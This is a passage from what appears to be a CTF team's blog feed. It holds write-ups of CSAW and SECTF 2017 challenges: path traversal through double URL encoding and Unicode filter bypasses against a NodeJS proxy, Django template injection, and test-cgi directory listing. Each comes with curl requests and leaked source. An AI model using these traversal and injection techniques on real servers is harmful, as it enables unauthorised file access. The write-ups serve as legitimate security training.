make????very ????ht pain??</div><div class="line">Partial key --&gt; A quart???? of o????ixed wi?? zinc o???? make????very ????ht pain??</div><div class="line">Partial key --&gt; A quart???? of o????ixed wi?? zinc o???? make????very br??ht pain??</div><div class="line">Partial key --&gt; A quart???? of oil??ixed wi?? zinc o???? make????very br??ht pain??</div><div class="line">Partial key --&gt; A quart???? of oil??ixed wi?? zinc o???? makes ??very br??ht pain??</div><div class="line">Partial key --&gt; A quart j?? of oil??ixed wi?? zinc o???? makes ??very br??ht pain??</div><div class="line">Partial key --&gt; A quart j?? of oil??ixed wi?? zinc oxi?? makes ??very br??ht pain??</div><div class="line">Partial key --&gt; A quart j?? of oil??ixed wi?? zinc oxi?? makes ??very br??ht paint|</div><div class="line">Partial key --&gt; A quart j?? of oil??ixed with zinc oxi?? makes ??very br??ht paint|</div><div class="line">Partial key --&gt; A quart j?? of oil??ixed with zinc oxi?? makes ??very bright paint|</div><div class="line">Partial key --&gt; A quart j?? of oil mixed with zinc oxi?? makes ??very bright paint|</div><div class="line">Partial key --&gt; A quart j?? of oil mixed with zinc oxi?? makes a very bright paint|</div><div class="line">Partial key --&gt; A quart jar of oil mixed with zinc oxi?? makes a very bright paint|</div><div class="line">plaintext: flag&#123;sti11_us3_da_x0r_for_my_s3cratz&#125;|</div><div class="line">A quart jar of oil mixed with zinc oxide makes a very bright paint|</div></pre></td></tr></table></figure>
<p>Very nice challenge.</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Another Xor&lt;br&gt;Hey, hey can you find my secret.&lt;br&gt;&lt;br&gt;&lt;a href=&quot;https://ctf.csaw.io/files/ef303796b276cd0bdf4f7c61b2606df5/c
    
    </summary>
    
      <category term="Crypto" scheme="https://teamrocketist.github.io/categories/Crypto/"/>
    
    
      <category term="crypto" scheme="https://teamrocketist.github.io/tags/crypto/"/>
    
      <category term="xor" scheme="https://teamrocketist.github.io/tags/xor/"/>
    
      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
    
  </entry>
  
  <entry>
    <title>[Web] CSAW - orange v3</title>
    <link href="https://teamrocketist.github.io/2017/09/18/Web-CSAW-orange-v3/"/>
    <id>https://teamrocketist.github.io/2017/09/18/Web-CSAW-orange-v3/</id>
    <published>2017-09-18T03:48:13.000Z</published>
    <updated>2017-09-26T15:32:16.809Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>orange v3<br><br>I wrote a little proxy program in NodeJS for my poems folder but I’m bad at programming so I had to rewrite it. Again.<br><br>I changed up flag.txt too but everyone still wants to read it…<br><br><a href="http://web.chal.csaw.io:7312/?path=orange.txt" target="_blank" rel="external">http://web.chal.csaw.io:7312/?path=orange.txt</a><br></blockquote>

<p>Keep in mind I didn’t solve this challenge during the CTF but I was pretty close, the way to do this was to use unicode characters, I gave up in mid way after trying alot of characters and gave up and started thinking there was another way of bypassing the new filters! but It didn’t, the reason why I’m doing the writeup is to explain why some approaches don’t work and others do, this write up is based after reading <a href="https://aadityapurani.com/2017/09/17/csaw-ctf-2017-writeups/" target="_blank" rel="external">dcua writeup</a> , so all the credits go to them!</p>
<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>Same problem as <a href="https://teamrocketist.github.io/2017/09/18/Web-CSAW-orange-v1/">orange v1</a> after testing a bunch of characters and see which ones were giving a 404 error BANNED and now our string must have “<strong>.txt</strong>“ at the end of the string so we are “stuck” into a one extension:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">r".|#|%"</span> <span class="comment"># --&gt; if the path GET parameter has any of this characters will return a 404</span></div></pre></td></tr></table></figure>
<p>Note that even null bytes don’t work here because the string must always end with “<strong>.txt</strong>“.</p>
<h3 id="Double-url-encoding-approach"><a href="#Double-url-encoding-approach" class="headerlink" title="Double url encoding approach"></a>Double url encoding approach</h3><p>Double url encoding no longer works and why? because the character “<strong>%</strong>“ is banned, so imagine that we try to inject this <strong>%202e</strong> the nodejs <strong>UrlParse</strong> function will decode it first into “<strong>%2e</strong>“ and the black list filter will block it because it contains a “<strong>%2e</strong>“!</p>
<h3 id="Why-are-they-banning-character"><a href="#Why-are-they-banning-character" class="headerlink" title="Why are they banning # character"></a>Why are they banning # character</h3><p>Remember the code from <a href="https://teamrocketist.github.io/2017/09/18/Web-CSAW-orange-v1/">orange v1</a>?</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> path = url.parse(req.url, <span class="literal">true</span>).query;</div><div class="line">path = path[<span class="string">'path'</span>];</div></pre></td></tr></table></figure>
<p>They are using url.parse! url parse in nodejs works the same way that php one works, here what happens when you add # character in php for example:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">$ php -r <span class="string">"var_dump(parse_url('web.chal.csaw.io:7312/?path=hi#.txt'));"</span></div><div class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123;</div><div class="line">  [<span class="string">"host"</span>]=&gt;</div><div class="line">  string(<span class="number">16</span>) <span class="string">"web.chal.csaw.io"</span></div><div class="line">  [<span class="string">"port"</span>]=&gt;</div><div class="line">  int(<span class="number">7312</span>)</div><div class="line">  [<span class="string">"path"</span>]=&gt;</div><div class="line">  string(<span class="number">1</span>) <span class="string">"/"</span></div><div class="line">  [<span class="string">"query"</span>]=&gt;</div><div class="line">  string(<span class="number">10</span>) <span class="string">"path=hello"</span></div><div class="line">  [<span class="string">"fragment"</span>]=&gt;</div><div class="line">  string(<span class="number">4</span>) <span class="string">".txt"</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>You can see the trick? yes if the programmer uses the query parameter he’s fucked! everything after the ‘#’ will go to the field “<strong>fragment</strong>“! And the string won’t have the  “<strong>.txt</strong>“ in the end of the string!</p>
<p>Same thing in nodejs:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</div><div class="line"><span class="built_in">console</span>.log(url.parse(<span class="string">'web.chal.csaw.io:7312/?path=hi#.txt'</span>, <span class="literal">true</span>).query);</div><div class="line"><span class="comment">// &#123; path: 'hi' &#125;</span></div></pre></td></tr></table></figure>
<h3 id="Bypassing-the-extension-filter"><a href="#Bypassing-the-extension-filter" class="headerlink" title="Bypassing the extension filter"></a>Bypassing the extension filter</h3><p>Well if “#” removes everything after it how do we bypass the extension? well lets do the obvious lets encode “#”</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">'web.chal.csaw.io:7312/?path=%23.txt'</span></div><div class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 3.2 Final//EN"</span>&gt;&lt;html&gt;</div><div class="line">&lt;title&gt;Directory listing <span class="keyword">for</span> /poems/&lt;/title&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;h2&gt;Directory listing <span class="keyword">for</span> /poems/&lt;/h2&gt;</div><div class="line">&lt;hr&gt;</div><div class="line">&lt;ul&gt;</div><div class="line">&lt;li&gt;&lt;a href=<span class="string">"burger.txt"</span>&gt;burger.txt&lt;/a&gt;</div><div class="line">&lt;li&gt;&lt;a href=<span class="string">"haiku.txt"</span>&gt;haiku.txt&lt;/a&gt;</div><div class="line">&lt;li&gt;&lt;a href=<span class="string">"orange.txt"</span>&gt;orange.txt&lt;/a&gt;</div><div class="line">&lt;li&gt;&lt;a href=<span class="string">"ppp.txt"</span>&gt;ppp.txt&lt;/a&gt;</div><div class="line">&lt;li&gt;&lt;a href=<span class="string">"the_red_wheelbarrow.txt"</span>&gt;the_red_wheelbarrow.txt&lt;/a&gt;</div><div class="line">&lt;/ul&gt;</div><div class="line">&lt;hr&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>It works! <strong>url.parse</strong> won’t remove the #, and after this nodejs will make a request at an url, and a GET request ignores everything after a #.<br>Now I will teach another way to bypass this but with another character “<strong>?</strong>“ or its url encoded version “<strong>%3F</strong>“:</p>
<p><strong>url.parse</strong> will do this:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</div><div class="line"><span class="built_in">console</span>.log(url.parse(<span class="string">'web.chal.csaw.io:7312/?path=hi?.txt'</span>, <span class="literal">true</span>).query);</div><div class="line"><span class="comment">// &#123; path: 'hi?.txt' &#125;</span></div></pre></td></tr></table></figure></p>
<p>WTH? if it isn’t the url parse what is happening here? </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> callback = <span class="function"><span class="keyword">function</span>(<span class="params">response</span>)</span>&#123;</div><div class="line"><span class="keyword">var</span> str = <span class="string">''</span>;</div><div class="line">response.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</div><div class="line">   str += chunk;</div><div class="line">&#125;);</div><div class="line">response.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">   res.end(str);</div><div class="line">&#125;);</div><div class="line">&#125;;</div><div class="line">http.get(base + path, callback).end();</div></pre></td></tr></table></figure>
<p>Yap it’s the <strong>http.get</strong> function, yes a GET request will ignore everything that is after a <strong>?</strong> and this works because this isn’t Local File Inclusion function like <strong>include</strong> in php but a HTTP REQUEST! amazing isn’t it?</p>
<h3 id="Bypassing-the-“-“-filter"><a href="#Bypassing-the-“-“-filter" class="headerlink" title="Bypassing the “.“ filter"></a>Bypassing the “<strong>.</strong>“ filter</h3><p>Everything else is blocked so the only thing that is left is unicode! You could find all UTF-16 characters at <a href="http://www.fileformat.info/info/charset/UTF-16/list.htm" target="_blank" rel="external">here</a> and the character was this one <a href="http://www.fileformat.info/info/unicode/char/012e/index.htm" target="_blank" rel="external">http://www.fileformat.info/info/unicode/char/012e/index.htm</a> </p>
<p><img src="https://i.imgur.com/jOpFFkn.png" alt=""></p>
<p>It works! now getting the flag!</p>
<p><img src="https://i.imgur.com/hdPmEUf.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;orange v3&lt;br&gt;&lt;br&gt;I wrote a little proxy program in NodeJS for my poems folder but I’m bad at programming so I had to rewrite
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="lfi" scheme="https://teamrocketist.github.io/tags/lfi/"/>
    
      <category term="blackbox" scheme="https://teamrocketist.github.io/tags/blackbox/"/>
    
  </entry>
  
  <entry>
    <title>[Web] CSAW - orange v1</title>
    <link href="https://teamrocketist.github.io/2017/09/18/Web-CSAW-orange-v1/"/>
    <id>https://teamrocketist.github.io/2017/09/18/Web-CSAW-orange-v1/</id>
    <published>2017-09-17T23:13:50.000Z</published>
    <updated>2017-09-18T00:50:25.306Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>orange v1<br><br>I wrote a little proxy program in NodeJS for my poems folder.<br><br>Everyone wants to read flag.txt but I like it too much to share.<br><br><a href="http://web.chal.csaw.io:7311/?path=orange.txt" target="_blank" rel="external">http://web.chal.csaw.io:7311/?path=orange.txt</a><br></blockquote>

<p>We don’t have much here, its just a <strong>GET</strong> parameter, after a bunch of tries we realized that “..” characters are banned, so lets try with double encoding:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">'http://web.chal.csaw.io:7311/?path=%252e%252e/'</span></div><div class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 3.2 Final//EN"</span>&gt;&lt;html&gt;</div><div class="line">&lt;title&gt;Directory listing <span class="keyword">for</span> /poems/../&lt;/title&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;h2&gt;Directory listing <span class="keyword">for</span> /poems/../&lt;/h2&gt;</div><div class="line">&lt;hr&gt;</div><div class="line">&lt;ul&gt;</div><div class="line">&lt;li&gt;&lt;a href=<span class="string">".dockerignore"</span>&gt;.dockerignore&lt;/a&gt;</div><div class="line">&lt;li&gt;&lt;a href=<span class="string">"back.py"</span>&gt;back.py&lt;/a&gt;</div><div class="line">&lt;li&gt;&lt;a href=<span class="string">"flag.txt"</span>&gt;flag.txt&lt;/a&gt;</div><div class="line">&lt;li&gt;&lt;a href=<span class="string">"poems/"</span>&gt;poems/&lt;/a&gt;</div><div class="line">&lt;li&gt;&lt;a href=<span class="string">"serve.sh"</span>&gt;serve.sh&lt;/a&gt;</div><div class="line">&lt;li&gt;&lt;a href=<span class="string">"server.js"</span>&gt;server.js&lt;/a&gt;</div><div class="line">&lt;/ul&gt;</div><div class="line">&lt;hr&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>And there it is the flag!</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">'http://web.chal.csaw.io:7311/?path=%252e%252e/flag.txt'</span></div><div class="line">flag&#123;thank_you_based_orange_for_this_ctf_challenge&#125;</div></pre></td></tr></table></figure>
<p>Since we could leak the source code here ill post it:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</div><div class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</div><div class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</div><div class="line"></div><div class="line"><span class="keyword">var</span> server = http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">var</span> path = url.parse(req.url, <span class="literal">true</span>).query;</div><div class="line">        path = path[<span class="string">'path'</span>];</div><div class="line">        <span class="keyword">if</span> (path.indexOf(<span class="string">".."</span>) == <span class="number">-1</span> &amp;&amp; path.indexOf(<span class="string">"ＮＮ"</span>) == <span class="number">-1</span>) &#123;</div><div class="line">            <span class="keyword">var</span> base = <span class="string">"http://localhost:8080/poems/"</span>;</div><div class="line">            <span class="keyword">var</span> callback = <span class="function"><span class="keyword">function</span>(<span class="params">response</span>)</span>&#123;</div><div class="line">                <span class="keyword">var</span> str = <span class="string">''</span>;</div><div class="line">                response.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</div><div class="line">                    str += chunk;</div><div class="line">                &#125;);</div><div class="line">                response.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                  res.end(str);</div><div class="line">                &#125;);</div><div class="line">            &#125;</div><div class="line">            http.get(base + path, callback).end();</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            res.writeHead(<span class="number">403</span>);</div><div class="line">            res.end(<span class="string">"WHOA THATS BANNED!!!!"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">catch</span> (e) &#123;</div><div class="line">        res.writeHead(<span class="number">404</span>);</div><div class="line">        res.end(<span class="string">'Oops'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;orange v1&lt;br&gt;&lt;br&gt;I wrote a little proxy program in NodeJS for my poems folder.&lt;br&gt;&lt;br&gt;Everyone wants to read flag.txt but I 
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="lfi" scheme="https://teamrocketist.github.io/tags/lfi/"/>
    
  </entry>
  
  <entry>
    <title>[Web] CSAW - Shia Labeouf-off</title>
    <link href="https://teamrocketist.github.io/2017/09/17/Web-CSAW-Shia-Labeouf-off/"/>
    <id>https://teamrocketist.github.io/2017/09/17/Web-CSAW-Shia-Labeouf-off/</id>
    <published>2017-09-17T21:27:02.000Z</published>
    <updated>2017-09-25T05:07:04.332Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Web<br>Shia Labeouf-off!<br><br>Do it<br><br>Just do it<br><br>Don’t let your dreams be dreams<br><br>Yesterday you said tomorrow<br><br>So just do it<br><br>Make your dreams come true<br><br>Just do it<br><br>Pick 1: <a href="http://web.chal.csaw.io:5487" target="_blank" rel="external">http://web.chal.csaw.io:5487</a> <a href="http://web.chal.csaw.io:5488" target="_blank" rel="external">http://web.chal.csaw.io:5488</a> <a href="http://web.chal.csaw.io:5489" target="_blank" rel="external">http://web.chal.csaw.io:5489</a> <a href="http://web.chal.csaw.io:5490" target="_blank" rel="external">http://web.chal.csaw.io:5490</a><br></blockquote>

<p>First of all great shout outs to CSAW for publishing a django challenge, even if it wasn’t a very hard one it was fun to do it.<br>Now going to the challenge, we know we have django debug mode enabled so lets try to generate some errors in the available webpages to see if we can leak some source code for example if we give an id in polls url we generate an exception:<br><a data-fancybox="gallery" href="https://i.imgur.com/xSLaeEE.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/xSLaeEE.png" alt=""><br></a></p>
<p>If we scroll down a little bit and check those hidden tabs, we can find some leaked source code!</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/lGE0ewJ.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/lGE0ewJ.png" alt=""><br></a></p>
<p>We have some nice custom made template filter tags! in django you can create custom tags and use it on templates, we have a function that lists the attributes(<code>listme</code>) of a python object one that gets attributes(<code>getme</code>):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@register.filter(name='getme')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getme</span><span class="params">(value, arg)</span>:</span></div><div class="line">  <span class="keyword">return</span> getattr(value, arg)</div><div class="line"></div><div class="line"><span class="meta">@register.filter(name='checknum')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">checknum</span><span class="params">(value)</span>:</span></div><div class="line">  check(value)</div><div class="line"><span class="meta">@register.filter(name='listme')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">listme</span><span class="params">(value)</span>:</span></div><div class="line">  <span class="keyword">return</span> dir(value)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(value)</span>:</span></div><div class="line">  <span class="keyword">if</span> value &gt; <span class="number">2</span>:</div><div class="line">    <span class="keyword">raise</span> Exception(<span class="string">"Our infrastructure can't support that many Shias!"</span>)</div></pre></td></tr></table></figure>
<p>Now we need to find a Server-Side Template Injection (SSTI) so we can use this useful filters we can inject code with: </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&#123;% expressions %&#125;</div><div class="line">&#123;&#123; arg1|filter:arg2 &#125;&#125;</div></pre></td></tr></table></figure>
<p>we can find one at <a href="http://web.chal.csaw.io:5490/ad-lib/" target="_blank" rel="external">http://web.chal.csaw.io:5490/ad-lib/</a> lets try to see the contents of debug variable:</p>
<h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><p><a data-fancybox="gallery" href="https://i.imgur.com/kpSR61D.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/kpSR61D.png" alt=""><br></a></p>
<h4 id="Results"><a href="#Results" class="headerlink" title="Results"></a>Results</h4><p><a data-fancybox="gallery" href="https://i.imgur.com/FGjThVh.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/FGjThVh.png" alt=""><br></a></p>
<p>Yap it works! the global debug leak alot of variables, mrpoopy object is interesting! lets check its attributes with the filter <code>listme</code></p>
<h4 id="Query-1"><a href="#Query-1" class="headerlink" title="Query"></a>Query</h4><p><a data-fancybox="gallery" href="https://i.imgur.com/q2lkMWY.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/q2lkMWY.png" alt=""><br></a></p>
<h4 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h4><p><a data-fancybox="gallery" href="https://i.imgur.com/vfBMY9u.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/vfBMY9u.png" alt=""><br></a></p>
<p>The flag must be in <code><strong>flag</strong></code>!! we need now to get this attribute with <code>getme</code> filter!</p>
<h4 id="Query-2"><a href="#Query-2" class="headerlink" title="Query"></a>Query</h4><p><a data-fancybox="gallery" href="https://i.imgur.com/yzNX42T.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/yzNX42T.png" alt=""><br></a></p>
<h4 id="Response-1"><a href="#Response-1" class="headerlink" title="Response"></a>Response</h4><p><a data-fancybox="gallery" href="https://i.imgur.com/adBD7A4.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/adBD7A4.png" alt=""><br></a></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Web&lt;br&gt;Shia Labeouf-off!&lt;br&gt;&lt;br&gt;Do it&lt;br&gt;&lt;br&gt;Just do it&lt;br&gt;&lt;br&gt;Don’t let your dreams be dreams&lt;br&gt;&lt;br&gt;Yesterday you said tom
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="python" scheme="https://teamrocketist.github.io/tags/python/"/>
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="pythonserver" scheme="https://teamrocketist.github.io/tags/pythonserver/"/>
    
      <category term="ssti" scheme="https://teamrocketist.github.io/tags/ssti/"/>
    
      <category term="django" scheme="https://teamrocketist.github.io/tags/django/"/>
    
  </entry>
  
  <entry>
    <title>[Web] SECTF - Sprinkler system</title>
    <link href="https://teamrocketist.github.io/2017/09/15/Web-SECTF-Sprinkler-system/"/>
    <id>https://teamrocketist.github.io/2017/09/15/Web-SECTF-Sprinkler-system/</id>
    <published>2017-09-15T19:36:03.000Z</published>
    <updated>2017-09-15T19:47:05.449Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br><br>Sprinkler system - Web (100 + 0)<br><br>Damn new york… some chick tricked you into standing in the rain on the very first day… it’s payback time!<br><br>Solves: 238<br><br>Service: <a href="http://sprinklers.alieni.se/" target="_blank" rel="external">http://sprinklers.alieni.se/</a><br><br>Author: avlidienbrunn<br><br></blockquote>

<p>Starting by looking into robots.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">curl <span class="string">'http://sprinklers.alieni.se/robots.txt'</span></div><div class="line">User-agent: *</div><div class="line">Disallow: /cgi-bin/<span class="built_in">test</span>-cgi</div></pre></td></tr></table></figure>
<p>We have a hidden directory /cgi-bin/test-cgi, my first instinct was to try shellshock but ofcourse it didn’t work so after a while searching in google I found this <a href="http://insecure.org/sploits/test-cgi.server_protocol.html" target="_blank" rel="external">http://insecure.org/sploits/test-cgi.server_protocol.html</a>.</p>
<p>To list the root directory we can do this:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">curl <span class="string">'http://sprinklers.alieni.se/cgi-bin/test-cgi?/*'</span></div><div class="line">CGI/1.0 <span class="built_in">test</span> script report:</div><div class="line"></div><div class="line">argc is 1. argv is /\*.</div><div class="line"></div><div class="line">SERVER_SOFTWARE = Apache/2.4.18 (Ubuntu)</div><div class="line">SERVER_NAME = sprinklers.alieni.se</div><div class="line">GATEWAY_INTERFACE = CGI/1.1</div><div class="line">SERVER_PROTOCOL = HTTP/1.1</div><div class="line">SERVER_PORT = 80</div><div class="line">REQUEST_METHOD = GET</div><div class="line">HTTP_ACCEPT = */*</div><div class="line">PATH_INFO = </div><div class="line">PATH_TRANSLATED = </div><div class="line">SCRIPT_NAME = /cgi-bin/<span class="built_in">test</span>-cgi</div><div class="line">QUERY_STRING = /app /bin /boot /dev /etc /git /home /lib /lib64 /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var</div><div class="line">REMOTE_HOST =</div><div class="line">REMOTE_ADDR = 172.68.102.79</div><div class="line">REMOTE_USER =</div><div class="line">AUTH_TYPE =</div><div class="line">CONTENT_TYPE =</div><div class="line">CONTENT_LENGTH =</div></pre></td></tr></table></figure></p>
<p>Nothing special on the root directory lets try to list the current directory to instead of doing ?/<em> lets try ?</em> at the end of the url:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">'http://sprinklers.alieni.se/cgi-bin/test-cgi?*'</span></div><div class="line">CGI/1.0 <span class="built_in">test</span> script report:</div><div class="line"></div><div class="line">argc is 1. argv is \*.</div><div class="line"></div><div class="line">SERVER_SOFTWARE = Apache/2.4.18 (Ubuntu)</div><div class="line">SERVER_NAME = sprinklers.alieni.se</div><div class="line">GATEWAY_INTERFACE = CGI/1.1</div><div class="line">SERVER_PROTOCOL = HTTP/1.1</div><div class="line">SERVER_PORT = 80</div><div class="line">REQUEST_METHOD = GET</div><div class="line">HTTP_ACCEPT = */*</div><div class="line">PATH_INFO = </div><div class="line">PATH_TRANSLATED = </div><div class="line">SCRIPT_NAME = /cgi-bin/<span class="built_in">test</span>-cgi</div><div class="line">QUERY_STRING = enable_sprinkler_system <span class="built_in">test</span>-cgi</div><div class="line">REMOTE_HOST =</div><div class="line">REMOTE_ADDR = 172.68.102.79</div><div class="line">REMOTE_USER =</div><div class="line">AUTH_TYPE =</div><div class="line">CONTENT_TYPE =</div><div class="line">CONTENT_LENGTH</div></pre></td></tr></table></figure>
<p>It works! there is a file named enable_sprinkler_system! lets see what is its content:<br><img src="https://i.imgur.com/0I4PAX0.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;&lt;br&gt;Sprinkler system - Web (100 + 0)&lt;br&gt;&lt;br&gt;Damn new york… some chick tricked you into standing in the rain on the very firs
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="cgi" scheme="https://teamrocketist.github.io/tags/cgi/"/>
    
      <category term="directorylisting" scheme="https://teamrocketist.github.io/tags/directorylisting/"/>
    
  </entry>
  
  <entry>
    <title>[Misc] SECTF - Joeys screenshot</title>
    <link href="https://teamrocketist.github.io/2017/09/15/Misc-SECTF-Joeys-screenshot/"/>
